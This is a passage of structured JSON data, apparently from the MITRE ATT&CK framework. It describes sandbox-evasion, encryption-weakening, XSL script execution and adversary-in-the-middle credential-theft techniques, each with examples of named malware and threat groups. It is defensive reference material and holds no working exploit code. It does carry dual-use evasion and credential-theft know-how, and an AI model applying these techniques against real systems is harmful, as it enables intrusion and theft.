and analysis platforms."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes."}], "sub_techniques": [{"name": "System Checks", "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.", "detailed_description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as malware, sample, or hash.\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.\nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.", "id": "T1497.001", "examples": [{"id": "S0373", "name": "Astaroth", "description": "Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments."}, {"id": "S0438", "name": "Attor", "description": "Attor can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information. "}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can check system flags and libraries, process timing, and API's to detect code emulation or sandboxing."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can check to see if the infected machine has VM tools running."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with .Md5.exe, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie."}, {"id": "S0354", "name": "Denis", "description": "Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP decryption relies on the infected machine's HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID value."}, {"id": "S0024", "name": "Dyre", "description": "Dyre can detect sandbox analysis environments by inspecting the process list and Registry."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments. "}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can run anti-sandbox checks using the Microsoft Excel 4.0 function GET.WORKSPACE to determine the OS version, if there is a mouse present, and if the host is capable of playing sounds."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax will check if it is being run in a virtualized environment by comparing the collected MAC address to c8:27:cc:c2:37:5a."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can detect VMWare via its I/O port and Virtual PC via the vpcext instruction."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT uses WMI to check the BIOS and manufacturer information for strings like \"VMWare\", \"Virtual\", and \"XEN\" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment. "}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call EnumWindows, and checking for Qemu guest agent."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can determine if it is running in a virtualized environment by checking the OS version, checking the number of running processes, ensuring a 64-bit application is running on a 64-bit host, and checking if the host has a valid MAC address."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner can parse the output of the native system_profiler tool to determine if the machine is running with 4 cores."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has checked the number of CPUs in the system to avoid being run in a sandbox or emulator."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is \"JOHN-PC.\""}, {"id": "S0637", "name": "NativeZone", "description": "NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor embeds code from the public al-khaser project, a repository that works to detect virtual machines, sandboxes, and malware analysis environments."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can halt execution if it identifies processes belonging to virtual machine software or analysis tools."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used macros to verify if a mouse is connected to a compromised machine."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query SELECT * FROM MSAcpi_ThermalZoneTemperature to check the temperature to see if it\u2019s running in a virtual environment."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as sysctl hw.model and the kernel boot time."}, {"id": "S0626", "name": "P8RAT", "description": "P8RAT can check the compromised host for processes associated with VMware or VirtualBox environments."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot performs a variety of system checks to determine if it is running in an analysis environment or sandbox, such as checking the number of processors (must be greater than two), and the amount of RAM (must be greater than 2GB)."}, {"id": "S0013", "name": "PlugX", "description": "PlugX checks if VMware tools is running in the background by searching for any process named \"vmtoolsd\"."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of \"License.txt\" and exiting."}, {"id": "S0192", "name": "Pupy", "description": "Pupy has a module that checks a number of indicators on the system to determine if its running on a virtual machine."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin performs a variety of system environment checks to determine if it is running in a virtualized or sandboxed environment, such as querying CPU temperature information and network card MAC address information."}, {"id": "S0332", "name": "Remcos", "description": "Remcos searches for Sandboxie and VMware on the system."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment. "}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can check for VMware-related files and DLLs related to sandboxes."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has run several virtual machine and sandbox checks, including checking if Sbiedll.dll is present in a list of loaded modules, comparing the machine name to HAL9TH and the user name to JohnDoe, and checking the BIOS version for known virtual machine identifiers."}, {"id": "S1019", "name": "Shark", "description": "Shark can stop execution if the screen width of the targeted machine is not over 600 pixels."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader scans processes to perform anti-VM checks. "}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has the ability to detect Windows Sandbox, VMWare, or VirtualBox by querying Win32_ComputerSystem to extract the Manufacturer string."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST checked the domain name of the compromised host to verify it was running in a real environment."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has the ability to determine if its runtime environment is virtualized."}, {"id": "S0242", "name": "SynAck", "description": "SynAck checks its directory location in an attempt to avoid launching in a sandbox."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has run system checks to determine if they were operating in a virtualized environment."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can stop its execution when it recognizes the presence of certain monitoring tools."}, {"id": "S0248", "name": "yty", "description": "yty has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware. "}]}, {"name": "User Activity Based Checks", "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.", "detailed_description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate.", "id": "T1497.002", "examples": [{"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes."}, {"id": "S0439", "name": "Okrum", "description": "Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments."}, {"id": "S0543", "name": "Spark", "description": "Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code."}]}, {"name": "Time Based Evasion", "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.", "detailed_description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.", "id": "T1497.003", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has waited a specified time before downloading a second stage payload."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has delayed communication to the actor-controlled IP address by 5 minutes."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can use a timer to delay execution of core functionality."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can call NtDelayExecution to pause execution."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to set a hardcoded and randomized sleep interval."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can wait 30 minutes before initiating contact with C2."}, {"id": "S0611", "name": "Clop", "description": "Clop has used the sleep command to avoid sandbox detection."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can determine when it has been installed on a host for at least 15 days before downloading the final payload."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can implement the kernel32.dll Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can use the GetTickCount and GetSystemTimeAsFileTime API calls to measure function timing. DRATzarus can also remotely shut down into sleep mode under specific conditions to evade detection."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can perform a  long sleep (greater than or equal to 3 minutes) to evade detection."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can turn itself on or off at random intervals."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy's installer has delayed installation of GoldenSpy for two hours after it reaches a victim system."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can designate a sleep period of more than 22 seconds between stages of infection."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can sleep for 195 - 205 seconds after payload execution and before deleting its task."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has the ability to perform anti-debugging based on time checks, API calls, and CPUID."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper will sleep for a random number of seconds, iterating 200 times over sleeps between one to three seconds, before continuing execution flow."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can wait 30 seconds before executing additional code if security software is detected."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has performed a time-based anti-debug check before downloading its third stage."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can pause for a number of hours before entering its C2 communication loop."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has delayed execution for five to six minutes during its persistence establishment process."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services."}, {"id": "S0626", "name": "P8RAT", "description": "P8RAT has the ability to \"sleep\" for a specified time to evade detection."}, {"id": "S0453", "name": "Pony", "description": "Pony has delayed execution using a built-in function to avoid detection and analysis."}, {"id": "S0650", "name": "QakBot", "description": "The QakBot dropper can delay dropping the payload to evade detection."}, {"id": "S0565", "name": "Raindrop", "description": "After initial installation, Raindrop runs a computation to delay execution."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used the command timeout 20 to pause the execution of its initial loader."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can execute WScript.Sleep to delay execution of its second stage."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster has the ability to put itself to \"sleep\" for a specified time."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can modify its sleep time responses from the default of 20-22 seconds."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST remained dormant after initial access for a period of up to two weeks."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can enter a sleep stage for 30 minutes to evade detection."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used printf and file I/O loops to delay process execution as part of API hammering."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used a 30 minute delay after execution to evade sandbox monitoring tools."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can pause for 20 seconds to bypass antivirus solutions."}, {"id": "S0658", "name": "XCSSET", "description": "Using the machine's local time, XCSSET waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, .report. After the elapsed time, XCSSET executes additional modules."}]}]}, {"name": "Weaken Encryption", "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications.", "detailed_description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. \nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as Modify System Image, Reduce Key Space, and Disable Crypto Hardware, an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts.", "id": "T1600", "examples": [], "sub_techniques": [{"name": "Reduce Key Space", "description": "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.", "detailed_description": "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.", "id": "T1600.001", "examples": []}, {"name": "Disable Crypto Hardware", "description": "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.", "detailed_description": "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space).", "id": "T1600.002", "examples": []}]}, {"name": "XSL Script Processing", "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.", "detailed_description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. \nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.\nCommand-line examples:\nAnother variation of this technique, dubbed \"Squiblytwo\", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.\nCommand-line examples:", "id": "T1220", "examples": [{"id": "S0373", "name": "Astaroth", "description": "Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain. "}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used an XSL file to run VBScript code."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader."}], "sub_techniques": []}]}, {"name": "Credential Access", "description": "The adversary is trying to steal account names and passwords.Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.", "id": "TA0006", "techniques": [{"name": "Adversary-in-the-Middle", "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.", "detailed_description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie). Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.", "id": "T1557", "examples": [{"id": "S0281", "name": "Dok", "description": "Dok proxies web traffic to potentially monitor and alter victim HTTP(S) traffic."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY opens a new network listener for the mpnotify.exe process that is typically contacted by the Winlogon process in Windows. A new, alternative RPC channel is set up with a malicious DLL recording plaintext credentials entered into Winlogon, effectively intercepting and redirecting the logon information."}], "sub_techniques": [{"name": "LLMNR/NBT-NS Poisoning and SMB Relay", "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.", "detailed_description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.", "id": "T1557.001", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks."}, {"id": "S0357", "name": "Impacket", "description": "Impacket modules like ntlmrelayx and smbrelayx can be used in conjunction with Network Sniffing and LLMNR/NBT-NS Poisoning and SMB Relay to gather NetNTLM credentials for Brute Force or relay attacks that can gain code execution."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group executed Responder using the command [Responder file path] -i [IP address] -rPv on a compromised host to harvest credentials and move laterally."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can sniff plaintext network credentials and use NBNS Spoofing to poison name services."}, {"id": "S0174", "name": "Responder", "description": "Responder is used to poison name services to gather hashes and credentials from systems within a local network."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning."}]}, {"name": "ARP Cache Poisoning", "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.", "detailed_description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.", "id": "T1557.002", "examples": [{"id": "G0003", "name": "Cleaver", "description": "Cleaver has used custom tools to facilitate ARP cache poisoning."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used ARP spoofing to redirect a compromised machine to an actor-controlled website."}]}, {"name": "DHCP Spoofing", "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. 